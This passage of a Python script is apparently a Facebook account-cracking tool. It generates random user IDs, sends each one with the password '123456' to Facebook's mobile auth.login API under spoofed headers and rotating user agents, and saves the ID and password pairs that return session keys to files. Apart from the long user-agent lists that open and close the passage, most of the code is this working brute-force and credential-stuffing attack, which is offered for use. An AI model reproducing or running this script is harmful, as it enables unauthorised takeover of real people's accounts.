AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.2118.24 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4078.30 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.3712.73 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.3945.45 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3666.45 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.3725.33 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.2256.51 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2692.10 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.2504.34 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.2679.22 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3709.52 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4304.61 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.4625.80 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.4748.57 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3333.26 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.3565.55 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2314.10 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.4267.100 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3442.27 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.2878.13 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3329.44 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2484.67 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.2911.18 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2338.93 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2755.39 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4470.19 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4534.86 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.3221.95 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.4248.94 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.2267.82 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3669.93 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.4740.43 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.4707.83 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.2700.60 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4909.83 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.3128.37 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3703.72 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.4071.53 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.3291.60 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.2655.40 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.2692.60 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.4047.54 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.2038.68 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.3133.12 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.2880.57 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3766.15 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.3976.13 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.3830.20 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.2466.26 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.2380.84 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.3103.67 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.3823.37 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.3427.51 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3863.99 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4686.69 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.4562.59 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2685.80 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4583.14 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3697.62 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.2014.48 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.2755.30 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4393.69 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.4224.90 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.3439.28 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2791.76 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.3094.87 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3564.19 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4452.70 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.2036.53 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2692.72 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.4404.86 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2076.11 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.2108.61 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.3805.89 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4083.43 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3920.80 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.2153.44 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.4295.46 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.2254.67 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.4127.54 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3755.16 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.2085.54 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3701.24 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.2527.69 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3440.15 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.4609.32 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4891.59 Safari/537.36;]"])
        sys.stdout.write('\r [ VIP ] %s/%s -> Ok:-%s - Cp:-%s ' % (self.loop, len(self.id), len(self.cp), len(self.ok)))
        sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            headers = {
                'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': rua,
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger' }
            response = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print('\r \x1b[0;92m[ vip-OK ] %s | %s\x1b[0;97m         ' % (uid, pw))
                print('\r \x1b[0;92m Congrats Bro ')
                self.ok.append('%s|%s' % (uid, pw))
                open('2009-vip-Ok.txt', 'a').write(' %s|%s\n' % (uid, pw))
            
            if 'www.facebook.com' in response.json()['error_msg']:
                print('\r \x1b[0;92m[ vip-OK ] %s | %s\x1b[0;97m         ' % (uid, pw))
                self.cp.append('%s|%s' % (uid, pw))
                open('2009-vip-OK.txt', 'a').write(' %s | %s\n' % (uid, pw))
            
        self.loop += 1

    
    def old2(self):
        x = 1111111111
        xx = 9999999999
        idx = '10000'
        os.system('clear')
        print(logo)
        limit = 50000000000000000
        
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))
            print('\x1b[0;93m [+] TOTAL ID -> \x1b[0;91m%s\x1b[0;97m' % len(self.id))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print('\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ')
                listpass = '123456'
                if len(listpass) <= 5:
                    exit('\n%s [!] PASSWORD MINIMUM 6 CHARACTERS' % B)
                print('%s [*] CRACK WITH PASSWORD -> [\x1b[0;91m%s\x1b[0;93m]' % (G, listpass))
                os.system('clear')
                print(logo)
                print(('\033[92m—'*30)+'\033[0;92m'+('—'*30))
                print('\033[97;1m[\033[92;1m+\033[97;1m] \033[93;1mFILE SAVE \033[38;5;196m: \033[38;5;46mvip-OK.txt\n\033[97;1m[\033[92;1m+\033[97;1m] \033[93;1mFILE SAVE \033[38;5;196m: \033[38;5;196mvip-CP.txt\n\033[97;1m[\033[92;1m✓\033[97;1m] \033[1;97mFIRST \033[1;34m[\033[1;32mON\033[1;97m \033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE \n\033[97;1m[\033[92;1m✓\033[97;1m] \033[1;97mMIX IDZ CLONING ENJOY DEAR USER')
                print(('\033[92m—'*30)+'\033[0;92m'+('—'*30))
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(','))
            exit('\n\n [>>] CRACK COMPLETE...')
        except:
            exit(str(e))



    
    def api(self, uid, pwx):
        rua = random.choice([
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3713.16 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.4862.38 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3025.85 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4065.95 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3152.80 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2278.59 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.2451.15 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.3057.71 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.4142.17 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.2515.40 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3686.61 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.2516.58 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.2725.63 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.3853.79 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.4047.74 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.4697.60 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.2955.71 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4479.92 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.3849.87 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2484.46 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.3610.37 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.3812.85 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4261.28 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.3823.32 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.3030.16 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.4626.65 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.3364.86 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.3045.58 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.4401.16 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2202.61 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.4806.18 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.4881.73 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2994.17 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2492.33 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2502.40 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2617.97 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3530.40 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2707.14 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.3345.91 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.3430.95 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3555.86 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.4200.86 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.3988.35 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2690.63 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.4969.91 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4967.90 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.2648.57 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.2841.49 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.2630.66 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4335.19 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4167.55 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.2157.76 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.4308.32 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.3874.40 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4752.58 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.4216.77 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.2230.38 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2440.50 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4821.63 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3672.10 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4991.78 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4304.12 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.3614.59 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.3885.42 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.4273.80 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.4872.37 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.4073.35 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2853.13 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.2602.41 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3267.33 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.4156.61 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.3177.48 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.4623.73 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.3007.14 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2712.27 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2344.28 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.4248.61 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.2255.39 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3955.77 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3112.15 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2838.49 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2959.14 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2008.50 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2538.100 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4476.21 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.2990.79 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.3990.22 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) 